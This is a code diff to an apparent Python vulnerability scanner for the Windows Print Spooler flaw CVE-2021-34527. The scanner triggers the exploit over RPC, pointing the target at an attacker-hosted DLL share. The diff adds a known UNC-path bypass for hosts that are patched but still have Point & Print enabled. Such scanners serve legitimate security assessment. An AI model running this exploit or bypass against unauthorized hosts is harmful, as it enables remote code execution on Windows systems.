@@ -37,7 +37,7 @@ def monitor_threadpool(pool, targets):
         percentage = Decimal(finished_threads) / Decimal(targets) * Decimal(100)
         log.info(f"completed: {percentage:.2f}% ({finished_threads}/{targets})")
 
-def check(vector, username, password, domain, address, port, timeout):
+def check(vector, username, password, domain, address, port, timeout, share="\\\\{0}\\itwasalladream\\bogus.dll"):
     results = {
         "address": address,
         "protocol": vector.PROTOCOL,
@@ -69,7 +69,7 @@ def check(vector, username, password, domain, address, port, timeout):
 
     else:
         local_ip = dce.get_rpc_transport().get_socket().getsockname()[0]
-        share = f"\\\\{local_ip}\\itwasalladream\\bogus.dll"
+        share = share.format(local_ip)
         #share = f"\\\\192.168.3.1\\itwasalladream\\bogus.dll"
 
         try:
@@ -91,38 +91,39 @@ def check(vector, username, password, domain, address, port, timeout):
         else:
             log.debug(f"pDriverPath found: {pDriverPath}")
             log.debug(f"Attempting DLL execution {share}")
-            for i in range(3, 0, -1):
-                try:
-                    vector.exploit(dce, pDriverPath, share)
-                except Exception as e:
-                    log.debug(e)
-                    # Spooler Service attempted to grab the DLL, host is vulnerable
-                    if str(e).find("ERROR_BAD_NETPATH") != -1:
-                        log.info(f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Host attempted to grab DLL from supplied share")
-                        results["vulnerable"] = True
-                        results["reason"] = "Host attempted to grab DLL from supplied share"
-                        break
 
-                    #elif str(e).find("ERROR_INVALID_HANDLE") != -1:
-                    #    log.debug("Got invalid handle.. trying again")
-                    #    continue
-
-                    elif str(e).find("_access_denied") != -1:
-                        log.info(f"{address} is not vulnerable over {vector.PROTOCOL}. Reason: RPC call returned access denied. This is usually an indication the host has been patched.")
-                        results["vulnerable"] = False
-                        results["reason"] = "RPC call returned access denied. This is usually an indication the host has been patched."
-                        break
-
-                    else:
-                        log.info(f"Unable to determine if {address} is vulnerable over {vector.PROTOCOL}. Got unexpected response: {e}")
-                        results["vulnerable"] = "Unknown"
-                        results["reason"] = f"Unable to determine if host is vulnerable. Got unexpected response: {e}"
-                        break
-                else:
-                    log.info(f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Host copied the DLL you're hosting.")
+            try:
+                vector.exploit(dce, pDriverPath, share)
+            except Exception as e:
+                log.debug(e)
+                # Spooler Service attempted to grab the DLL, host is vulnerable
+                if str(e).find("ERROR_BAD_NETPATH") != -1:
+                    log.info(f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Host attempted to grab DLL from supplied share")
                     results["vulnerable"] = True
-                    results["reason"] = "Reason: Host copied the DLL you're hosting."
-                    break
+                    results["reason"] = "Host attempted to grab DLL from supplied share"
+
+                elif str(e).find("ERROR_INVALID_PARAMETER") != -1:
+                    log.info(f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled. Re-trying with known UNC bypass to validate.")
+                    results = check(vector, username, password, domain, address, port, timeout, share="\\??\\UNC\\{0}\\itwasalladream\\bogus.dll")
+                    results["reason"] = f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Response indicates host has the CVE-2021-34527 patch applied *but* has Point & Print enabled."
+
+                #elif str(e).find("ERROR_INVALID_HANDLE") != -1:
+                #    log.debug("Got invalid handle.. trying again")
+                #    continue
+
+                elif str(e).find("rpc_s_access_denied") != -1:
+                    log.info(f"{address} is not vulnerable over {vector.PROTOCOL}. Reason: RPC call returned access denied. This is usually an indication the host has been patched *and* Point & Print is disabled.")
+                    results["vulnerable"] = False
+                    results["reason"] = "RPC call returned access denied. This is usually an indication the host has been patched."
+
+                else:
+                    log.info(f"Unable to determine if {address} is vulnerable over {vector.PROTOCOL}. Got unexpected response: {e}")
+                    results["vulnerable"] = "Unknown"
+                    results["reason"] = f"Unable to determine if host is vulnerable. Got unexpected response: {e}"
+            else:
+                log.info(f"{address} is vulnerable over {vector.PROTOCOL}. Reason: Host copied the DLL you're hosting.")
+                results["vulnerable"] = True
+                results["reason"] = "Reason: Host copied the DLL you're hosting."
 
     return results
 
